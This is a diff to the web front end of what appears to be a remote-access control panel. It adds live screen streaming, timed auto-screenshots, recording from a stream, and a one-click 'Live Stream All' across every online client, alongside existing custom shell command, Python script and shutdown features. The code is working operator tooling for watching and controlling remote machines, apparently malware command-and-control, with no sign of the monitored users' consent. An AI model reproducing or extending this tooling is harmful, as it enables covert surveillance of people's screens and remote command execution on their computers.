@@ -1615,6 +1615,75 @@
             object-fit: contain;
         }
 
+        /* Stream FPS Control */
+        .stream-controls {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 10px;
+            border-radius: var(--radius-md);
+            margin-bottom: 10px;
+        }
+
+        .stream-controls .form-group {
+            margin-bottom: 10px;
+        }
+
+        /* Live Preview Modal */
+        .live-preview-modal {
+            background: rgba(0, 0, 0, 0.98);
+        }
+
+        .live-preview-modal .modal-content {
+            max-width: 95vw;
+            max-height: 95vh;
+            width: 1200px;
+            height: 800px;
+        }
+
+        .live-preview-modal .modal-body {
+            display: flex;
+            flex-direction: column;
+            height: calc(100% - 60px);
+            padding: 0;
+        }
+
+        .live-preview-container {
+            flex: 1;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .live-preview-image {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+        }
+
+        .stream-controls-bar {
+            background: rgba(20, 0, 0, 0.95);
+            padding: 15px;
+            border-top: 1px solid var(--card-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .stream-stats {
+            font-family: 'Orbitron', monospace;
+            color: var(--accent);
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .stream-controls-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
         /* Responsive design */
         @media (max-width: 768px) {
             .main-content {
@@ -1888,6 +1957,7 @@
                                     <option value="restart">🔄 Restart Client</option>
                                     <option value="shutdown">⏻ Shutdown Client</option>
                                     <option value="record_screen">🎥 Record Screen</option>
+                                    <option value="live_screen">🔴 Live Screen Stream</option>
                                 </select>
                             </div>
                             
@@ -1895,6 +1965,14 @@
                                 <label class="form-label" id="commandParamsLabel">PARAMETERS</label>
                                 <textarea id="commandCode" class="form-control" rows="4" placeholder="Enter command..."></textarea>
                                 <div class="form-hint" id="commandParamsHint"></div>
+                            </div>
+                            
+                            <div id="liveStreamControls" class="stream-controls hidden">
+                                <div class="form-group">
+                                    <label class="form-label">STREAM FPS</label>
+                                    <input type="number" id="streamFps" class="form-control" value="10" min="1" max="30">
+                                    <div class="form-hint">Frames per second (1-30)</div>
+                                </div>
                             </div>
                             
                             <button onclick="sendCommand()" class="btn btn-primary w-full" id="sendCommandBtn">
@@ -2030,6 +2108,12 @@ if __name__ == "__main__":
                                 </button>
                                 <button onclick="refreshScreenshots()" class="btn btn-secondary btn-sm">
                                     <i class="fas fa-sync"></i> REFRESH
+                                </button>
+                                <button onclick="startAutoScreenshots()" class="btn btn-primary btn-sm">
+                                    <i class="fas fa-play-circle"></i> AUTO CAPTURE
+                                </button>
+                                <button onclick="stopAutoScreenshots()" class="btn btn-danger btn-sm">
+                                    <i class="fas fa-stop-circle"></i> STOP AUTO
                                 </button>
                             </div>
                         </div>
@@ -2341,6 +2425,9 @@ if __name__ == "__main__":
                                 <button onclick="quickAction('record_all')" class="btn btn-danger w-full justify-start">
                                     <i class="fas fa-record-vinyl"></i> Record All Screens
                                 </button>
+                                <button onclick="quickAction('live_stream_all')" class="btn btn-accent w-full justify-start">
+                                    <i class="fas fa-stream"></i> Live Stream All
+                                </button>
                                 <button onclick="quickAction('system_info_all')" class="btn btn-secondary w-full justify-start">
                                     <i class="fas fa-info-circle"></i> Get All System Info
                                 </button>
@@ -2476,6 +2563,7 @@ if __name__ == "__main__":
                         <option value="system_info">💻 Get System Info</option>
                         <option value="screenshot">📷 Capture Screenshot</option>
                         <option value="record_screen">🎥 Record Screen</option>
+                        <option value="live_screen">🔴 Live Screen Stream</option>
                         <option value="custom">⚡ Custom Command</option>
                         <option value="python">🐍 Python Script</option>
                     </select>
@@ -2571,7 +2659,8 @@ if __name__ == "__main__":
                 screenshotsPerPage: 12
             },
             recordingTimers: {},
-            activeRecordings: {}
+            activeRecordings: {},
+            activeStreams: {}
         };
 
         // ========== CHAT STATE ==========
@@ -2611,6 +2700,9 @@ if __name__ == "__main__":
             
             // Setup textarea auto-height
             setupTextareaAutoHeight();
+            
+            // Add auto controls to screenshots tab
+            addAutoControls();
         });
 
         function setupEventListeners() {
@@ -2626,6 +2718,15 @@ if __name__ == "__main__":
             // Settings inputs
             document.getElementById('settingsBackendUrl').addEventListener('change', (e) => {
                 CONFIG.BACKEND_URL = e.target.value;
+            });
+            
+            // Command type change
+            document.getElementById('commandType').addEventListener('change', (e) => {
+                if (e.target.value === 'live_screen') {
+                    document.getElementById('liveStreamControls').classList.remove('hidden');
+                } else {
+                    document.getElementById('liveStreamControls').classList.add('hidden');
+                }
             });
             
             // Close modals on ESC
@@ -2649,6 +2750,226 @@ if __name__ == "__main__":
                         this.style.overflowY = 'scroll';
                     } else {
                         this.style.overflowY = 'hidden';
+                    }
+                });
+            }
+        }
+
+        // ========== SCREEN STREAMING FUNCTIONS ==========
+        function startScreenStream(clientId) {
+            const fps = document.getElementById('streamFps').value || 10;
+            
+            showLoading('Starting live screen stream...');
+            
+            fetch(`${CONFIG.BACKEND_URL}/api/start-screen-stream`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${state.token}`
+                },
+                body: JSON.stringify({
+                    client_id: clientId,
+                    fps: parseInt(fps)
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showNotification('Live screen stream started', 'success');
+                    openLivePreview(clientId);
+                }
+            })
+            .catch(error => {
+                showNotification('Failed to start stream', 'error');
+            })
+            .finally(() => hideLoading());
+        }
+
+        function stopScreenStream(clientId) {
+            fetch(`${CONFIG.BACKEND_URL}/api/stop-screen-stream`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${state.token}`
+                },
+                body: JSON.stringify({ client_id: clientId })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showNotification('Live screen stream stopped', 'success');
+                    closeLivePreview();
+                }
+            })
+            .catch(error => {
+                showNotification('Failed to stop stream', 'error');
+            });
+        }
+
+        function openLivePreview(clientId) {
+            // Create live preview modal
+            const modal = document.createElement('div');
+            modal.id = 'livePreviewModal';
+            modal.className = 'modal live-preview-modal';
+            modal.innerHTML = `
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h3><i class="fas fa-video"></i> LIVE PREVIEW - ${clientId}</h3>
+                        <button class="modal-close" onclick="closeLivePreview()">&times;</button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="live-preview-container">
+                            <img id="livePreviewImage" class="live-preview-image" 
+                                 alt="Live screen stream">
+                        </div>
+                        <div class="stream-controls-bar">
+                            <div class="stream-stats" id="streamStats"></div>
+                            <div class="stream-controls-buttons">
+                                <button onclick="takeScreenshotFromStream()" class="btn btn-primary btn-sm">
+                                    <i class="fas fa-camera"></i> Capture Screenshot
+                                </button>
+                                <button onclick="startRecordingFromStream('${clientId}')" class="btn btn-danger btn-sm">
+                                    <i class="fas fa-record-vinyl"></i> Start Recording
+                                </button>
+                                <button onclick="stopScreenStream('${clientId}')" class="btn btn-secondary btn-sm">
+                                    <i class="fas fa-stop"></i> Stop Stream
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+            modal.style.display = 'flex';
+            
+            // Handle live stream frames
+            if (state.ws) {
+                state.ws.onmessage = function(event) {
+                    try {
+                        const data = JSON.parse(event.data);
+                        if (data.type === 'screen_stream_frame' && data.client_id === clientId) {
+                            updateLivePreview(data);
+                        }
+                    } catch (e) {
+                        console.error('Live preview error:', e);
+                    }
+                };
+            }
+        }
+
+        function updateLivePreview(data) {
+            const img = document.getElementById('livePreviewImage');
+            const stats = document.getElementById('streamStats');
+            
+            if (img) {
+                img.src = `data:image/jpeg;base64,${data.image_data}`;
+            }
+            
+            if (stats) {
+                const now = new Date();
+                stats.textContent = 
+                    `Frame #${data.frame_number} | ${now.toLocaleTimeString()} | ${data.image_data.length / 1024 | 0} KB`;
+            }
+        }
+
+        function closeLivePreview() {
+            const modal = document.getElementById('livePreviewModal');
+            if (modal) {
+                modal.remove();
+            }
+        }
+
+        function takeScreenshotFromStream() {
+            const img = document.getElementById('livePreviewImage');
+            if (img && img.src) {
+                // Create a temporary link to download the current frame
+                const link = document.createElement('a');
+                link.href = img.src;
+                link.download = `screenshot_${new Date().toISOString().replace(/[:.]/g, '-')}.jpg`;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                showNotification('Screenshot captured from stream', 'success');
+            }
+        }
+
+        function startRecordingFromStream(clientId) {
+            const duration = prompt('Recording duration (seconds):', '30');
+            if (duration) {
+                showLoading('Starting recording...');
+                fetch(`${CONFIG.BACKEND_URL}/api/start-auto-recordings`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${state.token}`
+                    },
+                    body: JSON.stringify({
+                        client_id: clientId,
+                        duration: parseInt(duration),
+                        interval: 1
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        showNotification(`Recording started for ${duration} seconds`, 'success');
+                    }
+                })
+                .catch(error => {
+                    showNotification('Failed to start recording', 'error');
+                })
+                .finally(() => hideLoading());
+            }
+        }
+
+        // ========== AUTO SCREENSHOTS CONTROLS ==========
+        function addAutoControls() {
+            // Auto controls are already added in the HTML
+        }
+
+        function startAutoScreenshots() {
+            const clientId = prompt('Enter client ID for auto screenshots:');
+            if (clientId) {
+                const interval = prompt('Capture interval (seconds):', '5');
+                if (interval) {
+                    fetch(`${CONFIG.BACKEND_URL}/api/start-auto-screenshots`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': `Bearer ${state.token}`
+                        },
+                        body: JSON.stringify({
+                            client_id: clientId,
+                            interval: parseInt(interval)
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.success) {
+                            showNotification(`Auto screenshots started (every ${interval}s)`, 'success');
+                        }
+                    });
+                }
+            }
+        }
+
+        function stopAutoScreenshots() {
+            const clientId = prompt('Enter client ID to stop auto screenshots:');
+            if (clientId) {
+                fetch(`${CONFIG.BACKEND_URL}/api/stop-auto-screenshots`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${state.token}`
+                    },
+                    body: JSON.stringify({ client_id: clientId })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        showNotification('Auto screenshots stopped', 'success');
                     }
                 });
             }
@@ -2744,7 +3065,8 @@ if __name__ == "__main__":
                 isInitialized: false,
                 settings: state.settings,
                 recordingTimers: {},
-                activeRecordings: {}
+                activeRecordings: {},
+                activeStreams: {}
             };
             
             // Reset chat state
@@ -3061,6 +3383,33 @@ if __name__ == "__main__":
                     showNotification(`New recording from ${data.client_id}`, 'info');
                     refreshRecordings();
                     break;
+                    
+                // ========== NEW STREAMING MESSAGES ==========
+                case 'screen_stream_frame':
+                    if (document.getElementById('livePreviewModal')) {
+                        updateLivePreview(data);
+                    }
+                    break;
+                    
+                case 'auto_screenshot_received':
+                    showNotification(`Auto screenshot from ${data.client_id}`, 'info');
+                    refreshScreenshots();
+                    break;
+                    
+                case 'auto_recording_received':
+                    showNotification(`Auto recording from ${data.client_id} (${data.duration}s)`, 'info');
+                    refreshRecordings();
+                    break;
+                    
+                case 'screen_stream_started':
+                    showNotification(`Screen stream started on ${data.client_id}`, 'info');
+                    state.activeStreams[data.client_id] = true;
+                    break;
+                    
+                case 'screen_stream_stopped':
+                    showNotification(`Screen stream stopped on ${data.client_id}`, 'info');
+                    delete state.activeStreams[data.client_id];
+                    break;
             }
         }
 
@@ -3208,11 +3557,15 @@ if __name__ == "__main__":
                 const isOnline = client.online || client.ws_online;
                 const statusClass = isOnline ? 'status-online' : 'status-offline';
                 const statusText = isOnline ? 'ONLINE' : 'OFFLINE';
+                const isStreaming = state.activeStreams[client.client_id];
                 
                 row.innerHTML = `
                     <td><code class="text-accent">${client.client_id.substring(0, 8)}</code></td>
                     <td>${client.name}</td>
-                    <td><span class="status-badge ${statusClass}">${statusText}</span></td>
+                    <td>
+                        <span class="status-badge ${statusClass}">${statusText}</span>
+                        ${isStreaming ? '<span class="status-badge status-running">STREAMING</span>' : ''}
+                    </td>
                     <td>${client.ip_address || 'N/A'}</td>
                     <td>${lastSeen}</td>
                     <td>
@@ -3228,6 +3581,9 @@ if __name__ == "__main__":
                             </button>
                             <button onclick="clientAction('${client.client_id}', 'record')" class="btn btn-danger btn-icon" title="Record Screen">
                                 <i class="fas fa-video"></i>
+                            </button>
+                            <button onclick="clientAction('${client.client_id}', 'live_stream')" class="btn btn-accent btn-icon" title="Live Screen Stream">
+                                <i class="fas fa-stream"></i>
                             </button>
                         </div>
                     </td>
@@ -3309,6 +3665,11 @@ if __name__ == "__main__":
                     document.getElementById('pythonClient').value = clientId;
                     switchTab('python');
                     break;
+                case 'live_stream':
+                    document.getElementById('commandClient').value = clientId;
+                    document.getElementById('commandType').value = 'live_screen';
+                    switchTab('commands');
+                    break;
             }
         }
 
@@ -3341,15 +3702,22 @@ if __name__ == "__main__":
             const commandType = document.getElementById('commandType').value;
             const paramsDiv = document.getElementById('commandParams');
             const codeTextarea = document.getElementById('commandCode');
+            const liveStreamControls = document.getElementById('liveStreamControls');
             
             if (commandType === 'custom') {
                 paramsDiv.classList.remove('hidden');
+                liveStreamControls.classList.add('hidden');
                 codeTextarea.placeholder = 'Enter custom command (e.g., "dir" or "ls -la")';
             } else if (commandType === 'record_screen') {
                 paramsDiv.classList.remove('hidden');
+                liveStreamControls.classList.add('hidden');
                 codeTextarea.placeholder = 'Enter recording parameters as JSON: {"duration": 30, "fps": 30, "quality": "medium"}';
+            } else if (commandType === 'live_screen') {
+                paramsDiv.classList.add('hidden');
+                liveStreamControls.classList.remove('hidden');
             } else {
                 paramsDiv.classList.add('hidden');
+                liveStreamControls.classList.add('hidden');
             }
         }
 
@@ -3359,6 +3727,12 @@ if __name__ == "__main__":
             
             if (!clientId) {
                 showNotification('Please select a client first', 'warning');
+                return;
+            }
+            
+            // Handle live screen stream
+            if (commandType === 'live_screen') {
+                startScreenStream(clientId);
                 return;
             }
             
@@ -3405,6 +3779,7 @@ if __name__ == "__main__":
                         showNotification(`Command sent to client`, 'success');
                         document.getElementById('commandCode').value = '';
                         document.getElementById('commandParams').classList.add('hidden');
+                        document.getElementById('liveStreamControls').classList.add('hidden');
                         await refreshCommands();
                     }
                 }
@@ -4951,9 +5326,9 @@ if __name__ == "__main__":
             } else if (type === 'python') {
                 paramsDiv.classList.remove('hidden');
                 textarea.placeholder = 'Enter Python code...';
-            } else if (type === 'record_screen') {
+            } else if (type === 'record_screen' || type === 'live_screen') {
                 paramsDiv.classList.remove('hidden');
-                textarea.placeholder = 'Enter recording parameters as JSON: {"duration": 30, "fps": 30, "quality": "medium"}';
+                textarea.placeholder = 'Enter parameters as JSON: {"duration": 30, "fps": 30, "quality": "medium"}';
             } else {
                 paramsDiv.classList.add('hidden');
                 textarea.placeholder = 'Parameters will be added automatically...';
@@ -4999,6 +5374,10 @@ if __name__ == "__main__":
                     } else {
                         throw new Error('WebSocket not connected');
                     }
+                } else if (commandType === 'live_screen') {
+                    // Handle live screen stream
+                    const fps = command ? JSON.parse(command).fps : 10;
+                    startScreenStream(clientId);
                 } else {
                     // Send command
                     const parameters = {};
@@ -5265,6 +5644,7 @@ if __name__ == "__main__":
         function clearCommandForm() {
             document.getElementById('commandCode').value = '';
             document.getElementById('commandParams').classList.add('hidden');
+            document.getElementById('liveStreamControls').classList.add('hidden');
             showNotification('Command form cleared', 'info');
         }
 
@@ -5276,6 +5656,19 @@ if __name__ == "__main__":
                     
                 case 'record_all':
                     startRecordingAll();
+                    break;
+                    
+                case 'live_stream_all':
+                    const onlineClients = state.clients.filter(c => c.online || c.ws_online);
+                    if (onlineClients.length === 0) {
+                        showNotification('No online clients', 'warning');
+                        return;
+                    }
+                    if (confirm(`Start live screen stream on ${onlineClients.length} clients?`)) {
+                        onlineClients.forEach(client => {
+                            startScreenStream(client.client_id);
+                        });
+                    }
                     break;
                     
                 case 'system_info_all':
@@ -5467,6 +5860,15 @@ if __name__ == "__main__":
         window.closeSettings = closeSettings;
         window.saveSettings = saveSettings;
         window.resetSettings = resetSettings;
+        window.startScreenStream = startScreenStream;
+        window.stopScreenStream = stopScreenStream;
+        window.openLivePreview = openLivePreview;
+        window.closeLivePreview = closeLivePreview;
+        window.takeScreenshotFromStream = takeScreenshotFromStream;
+        window.startRecordingFromStream = startRecordingFromStream;
+        window.startAutoScreenshots = startAutoScreenshots;
+        window.stopAutoScreenshots = stopAutoScreenshots;
+        window.addAutoControls = addAutoControls;
     </script>
 </body>
 </html>
